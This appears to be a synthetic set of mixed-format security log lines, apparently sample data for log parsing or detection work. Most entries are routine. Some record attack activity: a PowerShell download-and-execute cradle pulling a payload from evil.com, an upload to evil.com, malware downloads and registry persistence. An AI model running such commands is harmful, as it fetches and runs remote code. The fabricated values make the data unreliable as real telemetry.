<log>2023-10-25T14:23:01.123Z host-abc123 kernel: [12345.678901] IPv6: eth0: RFC 4861: Neighbor advertisement from fe80::1a2b:3c4d:5e6f:1a2b for fe80::5a6b:7c8d:9e0f:1a2b</log>
<log>Oct 25 14:23:01.456789 localhost sshd[12345]: Accepted publickey for user from 192.168.1.100 port 54322 ssh2: RSA SHA256:AbC123DeF456</log>
<log>{
"EventTime": "2023-10-25T14:23:02.000000Z",
"EventID": 4624,
"EventType": "AUDIT_SUCCESS",
"Channel": "Security",
"ComputerName": "WIN-SERVER01",
"IpAddress": "10.10.10.50",
"IpPort": 54322,
"LogonType": 10,
"SubjectUserSid": "S-1-5-21-123456789-1234567890-123456789-1001",
"SubjectUserName": "jdoe",
"TargetUserSid": "S-1-5-21-123456789-1234567890-123456789-500",
"TargetUserName": "Administrator"
}</log>
<log>2023-10-25T14:23:02.100000Z i-1234567890abcdef0 AWSCloudTrail us-east-1 123456789012 CreateInstance API_Key_ID=AKIAIOSFODNN7EXAMPLE InstanceID=i-987654321fedcba0 InstanceType=t3.large</log>
<log>Oct 25 14:23:02.345678 server01 pam_unix(sshd:session): session opened for user jdoe by (uid=0)</log>
<log>2023-10-25T14:23:03.123456Z eni-12345678 10.0.1.100 203.0.113.5 443 49152 6 20 4243 ACCEPT OK</log>
<log>2023-10-25 14:23:03.456 CST host-xyz.local com.apple.xpc.launchd[1] (com.apple.smd): Service attempted to register for endpoint com.apple.smd already registered by another process.</log>
<log>2023-10-25T14:23:04.000000Z 2023-10-25T14:23:04.000000Z_123.456.789.012_PANfw1 1,2023/10/25 14:23:04,001234567890,SYSTEM,threat,256,2023/10/25 14:23:04,192.168.1.200,10.10.10.10,0.0.0.0,0.0.0.0,rule_name,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:23:04,4242,1,51413,443,0,0,0x400000,tcp,alert,"ET MALWARE Possible Malware Infection",high,server-to-client,1234567890,0x0,10.0.0.0-10.255.255.255,United States,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:23:04,567890,ASA-1,106023,error,10.10.20.30,51515,192.168.12.34,80,,,deny TCP connection,ACL-DROP</log>
<log>{"timestamp":"2023-10-25T14:23:05.123456Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"192.168.1.150","src_port":54321,"dest_ip":"10.10.10.200","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL NETBIOS SMB-DS DCERPC ISystemActivatorClient bind attempt","category":"Potentially Bad Traffic","severity":2}}</log>
<log>2023-10-25T14:23:05.456789Z ftnt-fw-01 date=2023-10-25 time=14:23:05 devname="ftnt-fw-01" devid="FGT1234567890" level=warning srcip=10.1.1.50 dstip=203.0.113.10 srcport=54321 dstport=80 srcintf="port1" dstintf="port2" sessionid=123456789 policyid=1 service="HTTP" proto=6 action="deny" status="reset"</log>
<log>Oct 25 14:23:06.123456 dns-server01 named[1234]: client @0x7fabc1234567 10.2.3.4#54321 (www.example.com): query: www.example.com IN A + (10.2.3.4)</log>
<log>2023-10-25T14:23:06.456789Z dhcp-server01 dhcpd: DHCPREQUEST for 10.10.10.100 from aa:bb:cc:dd:ee:ff (host-abc) via eth0</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:23:07.123456Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-PROD/PROVIDERS/MICROSOFT.COMPUTE/VIRTUALMACHINES/VM-PROD-01","operationName":"MICROSOFT.COMPUTE/VIRTUALMACHINES/START/ACTION","properties":{"statusCode":"OK","statusMessage":"Started virtual machine 'VM-PROD-01'"}}</log>
<log>2023-10-25T14:23:07.456789Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:23:07.456789Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"user@example.com"},"requestMetadata":{"callerIp":"10.10.10.60"},"serviceName":"storage.googleapis.com","methodName":"storage.objects.get"}}</log>
<log>2023-10-25T14:23:08.123456Z 192.168.1.99 54321 10.10.10.10 3389 - - - - - - - - - - SENT_PACKET - 1234567890 - x.x.x.x</log>
<log>Oct 25 14:23:08.456789 dc01.domain.local kerberos(5): AS_REQ: 10.10.10.50(54321) - SERVER$@DOMAIN.LOCAL Error: PREAUTH_REQUIRED</log>
<log>{"timestamp":"2023-10-25T14:23:09.123456Z","event":"sso","result":"SUCCESS","source_ip":"192.168.1.200","user":"jane.doe@company.com","app":"salesforce-prod"}</log>
<log>2023-10-25T14:23:09.456789Z endpoint-edr-01 1234567890 PROCESS_START PID=1234 ParentPID=567 Image=C:\Windows\System32\notepad.exe User=DOMAIN\jdoe Cmdline="notepad.exe C:\temp\notes.txt" Hash=SHA256=abc123def456</log>
<log>Oct 25 14:23:10.123456 host-av-01 clamd[1234]: /home/user/file.exe: Win.Trojan.Generic-1234 FOUND</log>
<log>2023-10-25T14:23:10.456789Z zeek-conn.log {"ts":1698265390.456789,"uid":"C1234567890abcdef","id.orig_h":"10.10.10.5","id.orig_p":54321,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","service":"dns"}</log>
<log>2023-10-25T14:23:11.123456Z 10.0.2.100 54321 10.10.10.20 22 6 0 1 1234567890 1234567891 10 5</log>
<log>Oct 25 14:23:11.456789 vpn-gw-01[1234]: 10.10.20.30:54321 - 192.168.100.5:443 [user@domain.com] authenticated</log>
<log>2023-10-25T14:23:12.123456Z proxy-squid-01 1234567890.456 192.168.1.150 TCP_MISS/200 54321 GET http://www.example.com/ - DIRECT/203.0.113.20 text/html</log>
<log>{"EventTime":"2023-10-25T14:23:12.456789Z","EventID":4104,"EventType":"AUDIT_SUCCESS","Channel":"Microsoft-Windows-PowerShell/Operational","ComputerName":"WIN10-PC01","ScriptBlockText":"Get-Process","UserID":"S-1-5-21-123456789-1234567890-123456789-1002"}</log>
<log>2023-10-25T14:23:13.123456Z host-macos-01 com.apple.Terminal[1234]: CGDestroyWindow: Invalid window 12345</log>
<log>Oct 25 14:23:13.456789 host-abc123 kernel: [12345.678901] usb 3-1: new high-speed USB device number 5 using xhci_hcd</log>
<log>2023-10-25T14:23:14.123456Z i-987654321fedcba0 AWSCloudTrail us-east-1 123456789012 DeleteSecurityGroup API_Key_ID=AKIAIOSFODNN7EXAMPLE GroupId=sg-12345678</log>
<log>2023-10-25T14:23:14.456789Z eni-abcdef12 2001:db8:85a3::8a2e:370:7334 2001:db8:1234::5678:9101:1121 443 54321 6 150 12000 ACCEPT OK</log>
<log>2023-10-25 14:23:15.123 PST host-mac.local com.apple.xpc.launchd[1] (com.apple.apsd[1234]): Attempt to remove job with non-existent port: 0x7fabc1234567</log>
<log>2023-10-25T14:23:15.456789Z 2023-10-25T14:23:15.456789Z_123.456.789.012_PANfw1 1,2023/10/25 14:23:15,001234567890,SYSTEM,threat,256,2023/10/25 14:23:15,10.10.10.5,8.8.8.8,0.0.0.0,0.0.0.0,rule_name,,,dns,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:23:15,4242,1,54321,53,0,0,0x400000,udp,alert,"ET DNS Non-Existent Domain NXDomain Response",medium,client-to-server,1234567890,0x0,8.8.8.8-8.8.8.8,United States,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:23:16.123456,789012,ASA-2,106100,error,203.0.113.50,443,10.10.10.100,54321,,,access-list outside_cryptomap_cryptomap_ permitted tcp outside/203.0.113.50(443) inside/10.10.10.100(54321) hit-cnt 1 first hit [0x0, 0x0]</log>
<log>{"timestamp":"2023-10-25T14:23:16.456789Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"10.10.10.5","src_port":54321,"dest_ip":"8.8.8.8","dest_port":53,"proto":"UDP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL DNS query for .tk domain","category":"Potential Corporate Privacy Violation","severity":1}}</log>
<log>2023-10-25T14:23:17.123456Z ftnt-fw-02 date=2023-10-25 time=14:23:17 devname="ftnt-fw-02" devid="FGT9876543210" level=notice srcip=192.168.1.150 dstip=10.10.10.200 srcport=54321 dstport=22 srcintf="port1" dstintf="port2" sessionid=987654321 policyid=2 service="SSH" proto=6 action="accept" status="close" duration=60 sentbyte=12345 rcvdbyte=67890</log>
<log>Oct 25 14:23:17.456789 dns-resolver-01 named[5678]: client @0x7fabc1234567 10.10.10.5#54321 (malicious.tk): query: malicious.tk IN A + (10.10.10.5)</log>
<log>2023-10-25T14:23:18.123456Z dhcp-server02 dhcpd: DHCPACK on 10.10.10.150 to aa:bb:cc:dd:ee:ff (host-xyz) via eth1</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:23:18.456789Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-DEV/PROVIDERS/MICROSOFT.SQL/SERVERS/SQL-DEV-01/DATABASES/DB01","operationName":"MICROSOFT.SQL/SERVERS/DATABASES/SCHEMAS/TABLES/DELETE","properties":{"statusCode":"OK","statusMessage":"Table 'SensitiveData' deleted"}}</log>
<log>2023-10-25T14:23:19.123456Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:23:19.123456Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"service-account@project-id.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"10.10.10.70"},"serviceName":"bigquery.googleapis.com","methodName":"google.bigquery.v2.JobService.InsertJob"}}</log>
<log>2023-10-25T14:23:19.456789Z 10.10.10.60 54321 10.10.10.10 3389 - - - - - - - - - - RECV_PACKET - 1234567891 - x.x.x.x</log>
<log>Oct 25 14:23:20.123456 dc02.domain.local kerberos(5): TGS_REQ: 10.10.10.50(54321) - jdoe@DOMAIN.LOCAL for cifs/fileserver.domain.local@DOMAIN.LOCAL</log>
<log>{"timestamp":"2023-10-25T14:23:20.456789Z","event":"sso","result":"FAILURE","source_ip":"192.168.1.250","user":"attacker@evil.com","app":"salesforce-prod","reason":"Invalid credentials"}</log>
<log>2023-10-25T14:23:21.123456Z endpoint-edr-02 1234567891 PROCESS_INJECTION PID=5678 TargetPID=1234 Image=C:\Windows\System32\svchost.exe User=NT AUTHORITY\SYSTEM Hash=SHA256=def456abc123</log>
<log>Oct 25 14:23:21.456789 host-av-02 sophos: Threat "Trojan.GenericKD.1234567" detected in /home/user/downloads/file.exe and quarantined.</log>
<log>2023-10-25T14:23:22.123456Z zeek-http.log {"ts":1698265402.123456,"uid":"C1234567890abcdef","id.orig_h":"192.168.1.150","id.orig_p":54321,"id.resp_h":"203.0.113.30","id.resp_p":80,"method":"GET","host":"www.example.com","uri":"/malware.exe","user_agent":"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"}</log>
<log>2023-10-25T14:23:22.456789Z 10.0.3.200 54321 10.10.10.200 22 6 0 1 1234567892 1234567893 20 10</log>
<log>Oct 25 14:23:23.123456 vpn-gw-02[5678]: 10.10.20.40:54321 - 192.168.100.6:443 [malicious.user@evil.com] authentication failed: Wrong password.</log>
<log>2023-10-25T14:23:23.456789Z proxy-bluecoat-01 2023-10-25 14:23:23 123456 192.168.1.150 54321 http_get 203.0.113.30 80 http://www.example.com/malware.exe - DENIED_BY_POLICY "Blocked Malware Domain"</log>
<log>{"EventTime":"2023-10-25T14:23:24.123456Z","EventID":4103,"EventType":"AUDIT_SUCCESS","Channel":"Microsoft-Windows-PowerShell/Operational","ComputerName":"WIN-SERVER02","ScriptBlockText":"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')","UserID":"S-1-5-21-123456789-1234567890-123456789-1003"}</log>
<log>2023-10-25T14:23:24.456789Z host-macos-02 com.apple.Safari[5678]: CFNetwork internal error (0xc01a:/BuildRoot/Library/Caches/com.apple.xbs/Sources/CFNetwork/CFNetwork-1234.5.6/Connection/URLConnectionClient.cpp:1234)</log>
<log>Oct 25 14:23:25.123456 host-abc123 kernel: [12345.678901] ata1.00: exception Emask 0x0 SAct 0x0 SErr 0x0 action 0x0</log>
<log>2023-10-25T14:23:25.456789Z i-abcdef12345678901 AWSCloudTrail us-west-2 123456789012 RunInstances API_Key_ID=AKIAI44QH8DHBEXAMPLE InstanceID=i-1234567890abcdef0 InstanceType=m5.large</log>
<log>2023-10-25T14:23:26.123456Z eni-34567890 10.0.1.200 198.51.100.10 80 54321 6 45 6789 ACCEPT OK</log>
<log>2023-10-25 14:23:26.456 EST host-mac-pro.local com.apple.xpc.launchd[1] (com.apple.imagent[1234]): Throttling respawn: Will attempt to respawn in 10 seconds</log>
<log>2023-10-25T14:23:27.123456Z 2023-10-25T14:23:27.123456Z_123.456.789.012_PANfw1 1,2023/10/25 14:23:27,001234567890,SYSTEM,threat,256,2023/10/25 14:23:27,192.168.1.150,203.0.113.30,0.0.0.0,0.0.0.0,rule_name,,,http,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:23:27,4242,1,54321,80,0,0,0x400000,tcp,alert,"ET MALWARE Win32/Possible Malware Download",high,client-to-server,1234567890,0x0,203.0.113.30-203.0.113.30,Russia,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:23:27.456789,789013,ASA-3,733100,error,10.10.10.5,54321,8.8.8.8,53,,,teardown local-host inside:10.10.10.5 duration 0:00:01 bytes 85 TCP FINs</log>
<log>{"timestamp":"2023-10-25T14:23:28.123456Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"10.10.10.100","src_port":54321,"dest_ip":"10.10.10.200","dest_port":445,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL NETBIOS SMB-DS DCERPC ISystemActivatorClient bind attempt","category":"Potentially Bad Traffic","severity":2}}</log>
<log>2023-10-25T14:23:28.456789Z ftnt-fw-03 date=2023-10-25 time=14:23:28 devname="ftnt-fw-03" devid="FGT5555555555" level=warning srcip=10.10.10.100 dstip=10.10.10.200 srcport=54321 dstport=445 srcintf="port1" dstintf="port2" sessionid=555555555 policyid=3 service="MICROSOFT-DS" proto=6 action="deny" status="reset" reason="policy_deny"</log>
<log>Oct 25 14:23:29.123456 dns-server02 named[1234]: client @0x7fabc1234567 10.10.10.100#54321 (fileserver.domain.local): query: fileserver.domain.local IN A + (10.10.10.100)</log>
<log>2023-10-25T14:23:29.456789Z dhcp-server03 dhcpd: DHCPDISCOVER from aa:bb:cc:dd:ee:ff via eth2</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:23:30.123456Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-TEST/PROVIDERS/MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/NSG-TEST","operationName":"MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE","properties":{"statusCode":"OK","statusMessage":"Security rule 'AllowRDP' deleted from NSG 'NSG-TEST'"}}</log>
<log>2023-10-25T14:23:30.456789Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:23:30.456789Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"admin@domain.com"},"requestMetadata":{"callerIp":"10.10.10.80"},"serviceName":"compute.googleapis.com","methodName":"v1.compute.instances.stop"}}</log>
<log>2023-10-25T14:23:31.123456Z 10.10.10.70 54321 10.10.10.10 3389 - - - - - - - - - - SENT_PACKET - 1234567892 - x.x.x.x</log>
<log>Oct 25 14:23:31.456789 dc03.domain.local kerberos(5): AS_REP: 10.10.10.50(54321) - jdoe@DOMAIN.LOCAL</log>
<log>{"timestamp":"2023-10-25T14:23:32.123456Z","event":"sso","result":"SUCCESS","source_ip":"10.10.10.90","user":"john.smith@company.com","app":"okta-prod"}</log>
<log>2023-10-25T14:23:32.456789Z endpoint-edr-03 1234567892 FILE_CREATE PID=1234 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe User=DOMAIN\jdoe FilePath=C:\temp\malware.ps1 Hash=SHA256=ghi789jkl012</log>
<log>Oct 25 14:23:33.123456 host-av-03 mcafee: Access Protection violation: C:\Windows\System32\cmd.exe attempted to write to C:\Windows\System32\config\SAM (rule: Protect system files)</log>
<log>2023-10-25T14:23:33.456789Z zeek-ftp.log {"ts":1698265413.456789,"uid":"C1234567890abcdef","id.orig_h":"10.10.10.150","id.orig_p":54321,"id.resp_h":"203.0.113.40","id.resp_p":21,"user":"anonymous","password":"guest","command":"RETR","arg":"/confidential.pdf","reply_code":"226","reply_msg":"Transfer complete."}</log>
<log>2023-10-25T14:23:34.123456Z 10.0.4.50 54321 10.10.10.30 443 6 0 1 1234567894 1234567895 30 15</log>
<log>Oct 25 14:23:34.456789 vpn-gw-03[9012]: 10.10.20.50:54321 - 192.168.100.7:443 [user@domain.com] disconnected: Session timed out.</log>
<log>2023-10-25T14:23:35.123456Z proxy-squid-02 1234567891.123 10.10.10.150 TCP_DENIED/403 54321 POST http://evil.com/upload - NONE/- text/html</log>
<log>{"EventTime":"2023-10-25T14:23:35.456789Z","EventID":4688,"EventType":"AUDIT_SUCCESS","Channel":"Security","ComputerName":"WIN10-PC02","NewProcessName":"C:\Windows\System32\schtasks.exe","TokenElevationType":"%%1938","CreatorProcessName":"C:\Windows\System32\cmd.exe"}</log>
<log>2023-10-25T14:23:36.123456Z host-macos-03 com.apple.installer[1234]: PackageKit: Extracting file: /Applications/App.pkg</log>
<log>Oct 25 14:23:36.456789 host-abc123 kernel: [12345.678901] TCP: Possible SYN flooding on port 443. Sending cookies.</log>
<log>2023-10-25T14:23:37.123456Z i-987654321fedcba0 AWSCloudTrail us-east-1 123456789012 ModifySecurityGroupRules API_Key_ID=AKIAIOSFODNN7EXAMPLE GroupId=sg-12345678</log>
<log>2023-10-25T14:23:37.456789Z eni-90123456 10.0.2.150 198.51.100.20 22 54321 6 25 3456 ACCEPT OK</log>
<log>2023-10-25 14:23:38.123 UTC host-mac-mini.local com.apple.xpc.launchd[1] (com.apple.WebKit.WebContent.1234.567890[1234]): Service exited due to SIGKILL | sent by kernel_task[0]</log>
<log>2023-10-25T14:23:38.456789Z 2023-10-25T14:23:38.456789Z_123.456.789.012_PANfw1 1,2023/10/25 14:23:38,001234567890,SYSTEM,threat,256,2023/10/25 14:23:38,10.10.10.150,203.0.113.40,0.0.0.0,0.0.0.0,rule_name,,,ftp,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:23:38,4242,1,54321,21,0,0,0x400000,tcp,alert,"ET FTP Anonymous User Login Attempt",medium,client-to-server,1234567890,0x0,203.0.113.40-203.0.113.40,China,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:23:39.123456,789014,ASA-4,106101,error,192.168.12.34,51515,10.10.20.30,80,,,access-list inside_cryptomap_cryptomap_ denied tcp inside/192.168.12.34(51515) outside/10.10.20.30(80) hit-cnt 1 first hit [0x0, 0x0]</log>
<log>{"timestamp":"2023-10-25T14:23:39.456789Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"10.10.10.200","src_port":445,"dest_ip":"10.10.10.100","dest_port":54321,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL NETBIOS SMB-DS DCERPC ISystemActivatorClient bind attempt","category":"Potentially Bad Traffic","severity":2}}</log>
<log>2023-10-25T14:23:40.123456Z ftnt-fw-04 date=2023-10-25 time=14:23:40 devname="ftnt-fw-04" devid="FGT4444444444" level=notice srcip=10.10.10.200 dstip=10.10.10.100 srcport=445 dstport=54321 srcintf="port2" dstintf="port1" sessionid=444444444 policyid=4 service="MICROSOFT-DS" proto=6 action="accept" status="close" duration=120 sentbyte=9876 rcvdbyte=5432</log>
<log>Oct 25 14:23:40.456789 dns-server03 named[1234]: client @0x7fabc1234567 10.10.10.200#445 (evil.com): query: evil.com IN A + (10.10.10.200)</log>
<log>2023-10-25T14:23:41.123456Z dhcp-server04 dhcpd: DHCPOFFER on 10.10.10.200 to aa:bb:cc:dd:ee:ff via eth3</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:23:41.456789Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-PROD/PROVIDERS/MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/AKS-PROD","operationName":"MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/AGENTPOOLS/DELETE","properties":{"statusCode":"OK","statusMessage":"Agent pool 'nodepool1' deleted"}}</log>
<log>2023-10-25T14:23:42.123456Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:23:42.123456Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"user@domain.com"},"requestMetadata":{"callerIp":"10.10.10.90"},"serviceName":"iam.googleapis.com","methodName":"google.iam.v1.IAMPolicy.SetIamPolicy"}}</log>
<log>2023-10-25T14:23:42.456789Z 10.10.10.80 54321 10.10.10.10 3389 - - - - - - - - - - RECV_PACKET - 1234567893 - x.x.x.x</log>
<log>Oct 25 14:23:43.123456 dc04.domain.local kerberos(5): TGS_REP: 10.10.10.50(54321) - jdoe@DOMAIN.LOCAL for cifs/fileserver.domain.local@DOMAIN.LOCAL</log>
<log>{"timestamp":"2023-10-25T14:23:43.456789Z","event":"sso","result":"SUCCESS","source_ip":"10.10.10.100","user":"alice.jones@company.com","app":"workday-prod"}</log>
<log>2023-10-25T14:23:44.123456Z endpoint-edr-04 1234567893 NETWORK_CONNECTION PID=5678 Image=C:\Windows\System32\svchost.exe User=NT AUTHORITY\SYSTEM Protocol=TCP LocalAddress=10.10.10.100:54321 RemoteAddress=203.0.113.50:443 State=ESTABLISHED</log>
<log>Oct 25 14:23:44.456789 host-av-04 symantec: SecurityRisk.AndroidOS.Generic!gen123 found in /home/user/mobile/app.apk and deleted.</log>
<log>2023-10-25T14:23:45.123456Z zeek-smb.log {"ts":1698265425.123456,"uid":"C1234567890abcdef","id.orig_h":"10.10.10.100","id.orig_p":54321,"id.resp_h":"10.10.10.200","id.resp_p":445,"command":"NT_CREATE_ANDX","path":"\\PIPE\\srvsvc","file_id":1234,"file_name":"srvsvc"}</log>
<log>2023-10-25T14:23:45.456789Z 10.0.5.100 54321 10.10.10.40 21 6 0 1 1234567896 1234567897 40 20</log>
<log>Oct 25 14:23:46.123456 vpn-gw-04[3456]: 10.10.20.60:54321 - 192.168.100.8:443 [user@domain.com] reconnected after 3600 seconds.</log>
<log>2023-10-25T14:23:46.456789Z proxy-nginx-01 192.168.1.150 - - [25/Oct/2023:14:23:46 +0000] "GET /malware.exe HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"</log>
<log>{"EventTime":"2023-10-25T14:23:47.123456Z","EventID":4672,"EventType":"AUDIT_SUCCESS","Channel":"Security","ComputerName":"WIN-SERVER03","SubjectUserSid":"S-1-5-21-123456789-1234567890-123456789-500","SubjectUserName":"Administrator","PrivilegeList":"SeSecurityPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeSystemtimePrivilege,SeShutdownPrivilege,SeRemoteShutdownPrivilege,SeTakeOwnershipPrivilege,SeDebugPrivilege,SeSystemEnvironmentPrivilege,SeSystemProfilePrivilege,SeProfileSingleProcessPrivilege,SeIncreaseBasePriorityPrivilege,SeLoadDriverPrivilege,SeCreatePagefilePrivilege,SeIncreaseQuotaPrivilege,SeChangeNotifyPrivilege,SeUndockPrivilege,SeManageVolumePrivilege,SeImpersonatePrivilege,SeCreateGlobalPrivilege,SeIncreaseWorkingSetPrivilege,SeTimeZonePrivilege,SeCreateSymbolicLinkPrivilege,SeDelegateSessionUserImpersonatePrivilege"}</log>
<log>2023-10-25T14:23:47.456789Z host-macos-04 com.apple.AppleCamera[1234]: [AGC] -[AGCStillImageInputMetadataRecognizer recognizeFacesInMetadata:]: Found 2 faces in 0.123456 seconds.</log>
<log>Oct 25 14:23:48.123456 host-abc123 kernel: [12345.678901] nf_conntrack: table full, dropping packet.</log>
<log>2023-10-25T14:23:48.456789Z i-1234567890abcdef0 AWSCloudTrail us-east-1 123456789012 StopInstances API_Key_ID=AKIAIOSFODNN7EXAMPLE InstanceID=i-987654321fedcba0</log>
<log>2023-10-25T14:23:49.123456Z eni-56789012 10.0.3.100 198.51.100.30 443 54321 6 60 7890 ACCEPT OK</log>
<log>2023-10-25 14:23:49.456 GMT host-macbook.local com.apple.xpc.launchd[1] (com.apple.audio.audiohal[1234]): Service could not initialize: 16F1515: xpcproxy + 13564 [1395][F4A87B2A-6C1D-3B43-9A9A-5B7B1B5B7B1B]: 0x2</log>
<log>2023-10-25T14:23:50.123456Z 2023-10-25T14:23:50.123456Z_123.456.789.012_PANfw1 1,2023/10/25 14:23:50,001234567890,SYSTEM,threat,256,2023/10/25 14:23:50,10.10.10.200,10.10.10.100,0.0.0.0,0.0.0.0,rule_name,,,smb,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Allowed by Policy,2023/10/25 14:23:50,4242,1,445,54321,0,0,0x400000,tcp,alert,"ET POLICY SMB2 NT Create Request for an Executable File",medium,server-to-client,1234567890,0x0,10.10.10.100-10.10.10.100,United States,0,,0,,,0,,,,,,,,0,0,0,0,0,,PA-500,,,0,0,0,0,0,0,0,0,0,0</log>
<log>10/25/2023 14:23:50.456789,789015,ASA-5,305011,error,10.10.10.5,54321,8.8.8.8,53,,,Built dynamic TCP translation from inside:10.10.10.5/54321 to outside:203.0.113.5/54321</log>
<log>{"timestamp":"2023-10-25T14:23:51.123456Z","flow_id":1234567890123456,"event_type":"alert","src_ip":"2001:db8:1234::5678:9101:1121","src_port":54321,"dest_ip":"2001:db8:85a3::8a2e:370:7334","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2100498,"rev":1,"signature":"GPL HTTP RESPONSE encoded content type mismatch","category":"Potentially Bad Traffic","severity":2}}</log>
<log>2023-10-25T14:23:51.456789Z ftnt-fw-05 date=2023-10-25 time=14:23:51 devname="ftnt-fw-05" devid="FGT3333333333" level=notice srcip=2001:db8:1234::5678:9101:1121 dstip=2001:db8:85a3::8a2e:370:7334 srcport=54321 dstport=80 srcintf="port1" dstintf="port2" sessionid=333333333 policyid=5 service="HTTP" proto=6 action="accept" status="close" duration=30 sentbyte=1234 rcvdbyte=5678</log>
<log>Oct 25 14:23:52.123456 dns-server04 named[1234]: client @0x7fabc1234567 2001:db8:1234::5678:9101:1121#54321 (www.google.com): query: www.google.com IN AAAA + (2001:db8:1234::5678:9101:1121)</log>
<log>2023-10-25T14:23:52.456789Z dhcp-server05 dhcpd: DHCPINFORM from 10.10.10.250 via eth4</log>
<log>{"logType":"AZURE_ACTIVITY","time":"2023-10-25T14:23:53.123456Z","resourceId":"/SUBSCRIPTIONS/12345678-1234-1234-1234-123456789012/RESOURCEGROUPS/RG-DEV/PROVIDERS/MICROSOFT.STORAGE/STORAGEACCOUNTS/STGDEV01","operationName":"MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION","properties":{"statusCode":"OK","statusMessage":"List keys operation successful for storage account 'STGDEV01'"}}</log>
<log>2023-10-25T14:23:53.456789Z 123456789012 PROJECT_ID cloudaudit.googleapis.com/activity 2023-10-25T14:23:53.456789Z {"logName":"projects/PROJECT_ID/logs/cloudaudit.googleapis.com%2Factivity","protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","status":{},"authenticationInfo":{"principalEmail":"service-account@project-id.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"10.10.10.100"},"serviceName":"kms.googleapis.com","methodName":"cloudkms.googleapis.com.CryptoKeyVersion.Destroy"}}</log>
<log>2023-10-25T14:23:54.123456Z 10.10.10.90 54321 10.10.10.10 3389 - - - - - - - - - - SENT_PACKET - 1234567894 - x.x.x.x</log>
<log>Oct 25 14:23:54.456789 dc05.domain.local kerberos(5): KRB5KDC_ERR_PREAUTH_FAILED: 10.10.10.60(54321) - Wrong password for user@DOMAIN.LOCAL</log>
<log>{"timestamp":"2023-10-25T14:23:55.123456Z","event":"sso","result":"FAILURE","source_ip":"10.10.10.110","user":"attacker@evil.com","app":"okta-prod","reason":"Suspicious activity detected"}</log>
<log>2023-10-25T14:23:55.456789Z endpoint-edr-05 1234567894 REGISTRY_MODIFY PID=1234 Image=C:\Windows\System32\reg.exe User=DOMAIN\jdoe KeyPath="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ValueName="Malware" ValueData="C:\temp\malware.exe"</log>
<log>Oct 25 14:23:56.123456 host-av-05 trendmicro: Virus 'W97M/Downloader.gen' detected in file \\fileserver\share\document.doc and cleaned.</log>
